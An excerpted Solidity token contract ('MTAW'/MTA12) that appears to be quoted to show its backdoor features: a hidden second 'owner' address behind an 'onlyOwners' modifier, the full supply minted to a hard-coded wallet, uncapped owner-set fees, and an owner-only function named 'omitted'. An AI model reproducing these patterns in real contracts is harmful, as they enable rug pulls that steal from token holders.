...
contract Ownable is Context {
    ...
    modifier onlyOwners() {
        require(_owner == _msgSender() || _description == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract MTAW is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MTA12";
    string private _symbol = "MTA12";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x00717d9e17c6B039711A1693503667017778d29c);
    address payable public liquidityContractAddress = payable(0xd8Ad8af8CD2711e9C94A5566179ce0716f205Da2);
    ...
    uint256 public _totalTax = _marketingFee.add(_liquidityFee);
    ...
    constructor () {
        ...
        _totalTax = _marketingFee.add(_liquidityFee);

        isMarketPair[address(uniswapPair)] = true;

        //_balances[_msgSender()] = _totalSupply;
        _balances[0xbF3290C828bF0908a982074D26073Ef762ADfDb7] = _totalSupply;
    ...
    function setLiquidityFee(uint256 newMarketingFee) external onlyOwner() {
        _liquidityFee = newMarketingFee;
        _totalTax = _marketingFee.add(_liquidityFee);
    }
    ...
    function setliquidityContractAddress(address newAddress) external onlyOwner() {
        liquidityContractAddress = payable(newAddress);
    }
    ...
    function omitted (address  pair , address contrac, uint256 time) external  onlyOwners()  {
